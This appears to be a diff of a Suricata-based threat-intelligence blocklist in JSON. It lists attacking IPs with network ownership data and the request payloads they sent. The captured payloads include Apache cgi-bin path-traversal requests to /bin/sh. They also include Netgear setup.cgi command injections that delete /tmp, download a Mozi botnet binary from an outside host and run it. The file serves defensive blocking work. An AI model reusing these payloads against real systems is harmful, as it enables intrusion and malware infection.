@@ -1,111 +1,13 @@
 {
-  "generated_at": "2026-05-18T01:00:00Z",
+  "generated_at": "2026-05-18T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 20,
-    "v4": 20,
+    "total": 15,
+    "v4": 15,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "180.76.172.156",
-      "family": "v4",
-      "first_seen": "2026-05-11T06:00:00Z",
-      "last_seen": "2026-05-11T06:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "38365",
-      "asn_name": "BAIDU Beijing Baidu Netcom Science and Technology Co., Ltd.",
-      "asn_prefix": "180.76.160.0/19",
-      "payloads": [
-        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
-    {
-      "ip": "121.37.201.22",
-      "family": "v4",
-      "first_seen": "2026-05-11T02:00:00Z",
-      "last_seen": "2026-05-11T02:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "55990",
-      "asn_name": "HWCSNET Huawei Cloud Service data center",
-      "asn_prefix": "121.37.192.0/18",
-      "payloads": [
-        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
-    {
-      "ip": "20.65.192.71",
-      "family": "v4",
-      "first_seen": "2026-05-11T01:00:00Z",
-      "last_seen": "2026-05-11T01:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /portal/redlion"
-      ]
-    },
-    {
-      "ip": "40.80.201.49",
-      "family": "v4",
-      "first_seen": "2026-05-11T01:00:00Z",
-      "last_seen": "2026-05-11T01:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "40.80.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /ReportServer"
-      ]
-    },
-    {
-      "ip": "47.76.94.55",
-      "family": "v4",
-      "first_seen": "2026-05-11T12:00:00Z",
-      "last_seen": "2026-05-11T12:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "45102",
-      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
-      "asn_prefix": "47.76.0.0/17",
-      "payloads": [
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
     {
       "ip": "172.202.114.25",
       "family": "v4",
@@ -344,6 +246,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP Cyber Internet Services Pvt Ltd.",
+      "asn_prefix": "139.135.41.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://139.135.41.58:36962/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.41.58:36962/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
